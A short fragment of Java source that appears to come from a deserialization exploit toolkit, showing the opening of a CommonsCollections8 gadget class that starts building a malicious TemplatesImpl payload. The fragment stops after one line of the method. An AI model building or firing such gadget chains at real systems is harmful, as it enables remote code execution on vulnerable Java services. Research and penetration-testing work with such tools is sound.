...
public class CommonsCollections8 implements ObjectGadget<TreeBag> {


    public TreeBag getObject(final EXP exploitType) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(exploitType);
